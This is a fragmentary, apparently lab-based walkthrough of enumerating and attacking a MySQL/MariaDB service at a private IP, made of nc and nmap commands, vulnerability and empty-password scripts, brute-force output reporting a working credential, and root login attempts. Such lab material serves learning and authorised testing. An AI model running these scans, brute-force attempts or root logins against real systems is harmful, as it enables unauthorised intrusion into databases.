...
```bash
nc -nv 192.168.144.131 3306
```

```
Connection to 192.168.144.131 3306 port [tcp/*] succeeded!
...
```bash
nmap -sV -p 3306 --script default 192.168.144.131
```
...
```bash
mysql -h 192.168.144.131 -u root
```
...
```bash
nmap -p 3306 --script mysql-info 192.168.144.131
```
...
```bash
nmap -p 3306 --script mysql-empty-password 192.168.144.131
```
...
```bash
nmap -p 3306 --script mysql-vuln-cve2012-2122 192.168.144.131
```
...
```
[*] 192.168.144.131:3306 - 192.168.144.131:3306 is running MySQL, but responds with an error: \x04Host '192.168.144.129' is not allowed to connect to this MariaDB server
[*] 192.168.144.131:3306 - Scanned 1 of 1 hosts (100% complete)
```
...
```
[-] 192.168.144.131:3306  - 192.168.144.131:3306 Unable to login from this host due to policy (may still be vulnerable)
[*] 192.168.144.131:3306  - Scanned 1 of 1 hosts (100% complete)
```
...
```
[-] 192.168.144.131:3306  - 192.168.144.131:3306 - Unsupported target version of MySQL detected. Skipping.
[*] 192.168.144.131:3306  - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.144.131:3306  - Bruteforce completed, 1 credential was successful.
[*] 192.168.144.131:3306  - You can open an MySQL session with these credentials and CreateSession set to true
```
...
```bash
mysql -h 192.168.144.131 -u root -p
```
